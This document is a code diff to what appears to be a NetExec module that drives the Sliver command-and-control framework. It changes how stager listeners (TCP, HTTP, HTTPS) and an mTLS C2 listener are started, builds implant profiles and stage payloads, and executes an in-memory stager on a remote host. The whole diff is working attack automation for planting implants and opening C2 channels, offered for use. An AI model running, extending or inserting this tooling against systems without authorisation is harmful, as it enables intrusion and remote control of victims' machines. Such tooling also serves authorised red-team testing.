@@ -136,14 +136,14 @@ class GrpcWorker:
         await client.start_mtls_listener(host, port)
 
     async def _do_start_tcp_stager_listener(self, host, port):
-        """Start TCP stager listener (HTTP/TCP for staging)."""
+        """Start TCP stager listener."""
         client = await self._do_connect(self.config_path)
         _import_protobuf()
         req = clientpb.StagerListenerReq()
         req.Host = host
         req.Port = port
         req.Protocol = clientpb.StageProtocol.TCP
-        resp = await client.raw_stub.StartStagerListener(req, timeout=30)
+        resp = await client.raw_stub.StartTCPStagerListener(req, timeout=30)
         return resp
 
     async def _do_implant_profiles(self):
@@ -179,29 +179,55 @@ class GrpcWorker:
         resp = await client.raw_stub.StageImplantBuild(req, timeout=30)
         return resp
     
-    async def _do_start_stager_listener(self, host, port, protocol):
-        """Start stager listener (HTTP or TCP based on protocol).
+    async def _do_start_stager_listener(self, host, port, protocol, profile_name=None, stage_data=None):
+        """Start stager listener based on protocol.
         
-        Sliver 1.5.44+ uses a single StartStagerListener RPC with StageProtocol enum
-        to differentiate between TCP, HTTP, and HTTPS staging listeners.
+        TCP: Uses dedicated StartTCPStagerListener RPC with embedded stage data.
+        HTTP/HTTPS: Starts regular HTTP(S) listener. Stage must already be registered
+                    via StageImplantBuild before calling this method.
+        
+        Args:
+            host: Bind host
+            port: Bind port  
+            protocol: 'tcp', 'http', or 'https'
+            profile_name: Name of implant profile (required for TCP)
+            stage_data: Stage payload bytes (required for TCP)
+        
+        Returns:
+            Job ID of the started listener
         """
         client = await self._do_connect(self.config_path)
         _import_protobuf()
-        req = clientpb.StagerListenerReq()
-        req.Host = host
-        req.Port = port
-        # Set enum (StageProtocol: TCP=0, HTTP=1, HTTPS=2)
+        protocol = protocol.lower()
+        
         if protocol == "tcp":
+            # TCP has dedicated stager listener with embedded data
+            if not profile_name or not stage_data:
+                raise ValueError("profile_name and stage_data required for TCP stager")
+            req = clientpb.StagerListenerReq()
+            req.Host = host
+            req.Port = port
             req.Protocol = clientpb.StageProtocol.TCP
-        elif protocol == "http":
-            req.Protocol = clientpb.StageProtocol.HTTP
-        elif protocol == "https":
-            req.Protocol = clientpb.StageProtocol.HTTPS
+            req.ProfileName = profile_name
+            req.Data = stage_data
+            resp = await client.raw_stub.StartTCPStagerListener(req, timeout=30)
+            return resp.JobID
+        elif protocol in ["http", "https"]:
+            # HTTP/HTTPS uses regular listener
+            # Stage must already be registered via StageImplantBuild
+            req = clientpb.HTTPListenerReq()
+            req.Host = host
+            req.Port = port
+            req.Secure = (protocol == "https")
+            
+            if protocol == "https":
+                resp = await client.raw_stub.StartHTTPSListener(req, timeout=30)
+            else:
+                resp = await client.raw_stub.StartHTTPListener(req, timeout=30)
+            
+            return resp.JobID
         else:
             raise ValueError(f"Unsupported STAGER_PROTOCOL: {protocol} (use 'tcp', 'http', or 'https')")
-        # Use single StartStagerListener RPC for all protocols (Sliver 1.5.44 API)
-        resp = await client.raw_stub.StartStagerListener(req, timeout=30)
-        return resp
 
     async def _do_generate_shellcode(self, ic):
         """Generate shellcode directly using Generate RPC."""
@@ -924,23 +950,33 @@ class NXCModule:
                 self.stage_port = self.rport  # Define if needed
                 # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
                 _ = self._get_worker_and_connect()
-                # Start HTTP listener FIRST
-                self._worker_submit('start_stager_listener', self.stager_rhost or self.rhost, self.stager_rport or self.rport, self.stager_protocol)
+                
+                # Build profile for stage2 (defines profile_name; already has connect guard)
+                _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)
+                
+                # Gen bootstrap + prep stage2 (this also registers the stage)
+                self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)
+                
+                # Now start stager listener with the profile name and stage data
+                self._worker_submit('start_stager_listener', 
+                                  self.stager_rhost or self.rhost, 
+                                  self.stager_rport or self.rport, 
+                                  self.stager_protocol,
+                                  profile_name,
+                                  self.stager_data)
                 context.log.info(f"Started {self.stager_protocol.upper()} stager listener on {self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}")
+                
                 # Now start mTLS listener for stage 2
                 self.mtls_port = self.rport  # Use RPORT for stage 2 mTLS
                 _ = self._get_worker_and_connect()  # Re-ensure for mTLS
                 self._worker_submit('start_mtls_listener', self.rhost, self.mtls_port)
                 context.log.info(f"Started mTLS C2 listener for stage 2 on {self.rhost}:{self.mtls_port}")
-                # Build profile for stage2 (defines profile_name; already has connect guard)
-                _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)
-                # Gen bootstrap + prep stage2
-                self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)
+                
                 success = handler.stage_execute(context, connection, os_type, self.stager_data)
                 if not success:
                     context.log.fail("Stager execution failed")
                     sys.exit(1)
-                context.log.info(f"Stager executed on {host} via {protocol} (multi-stage HTTP)")
+                context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.stager_protocol.upper()})")
                 full_remote_path = None  # In-memory; no cleanup needed
             else:
                 ic = self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
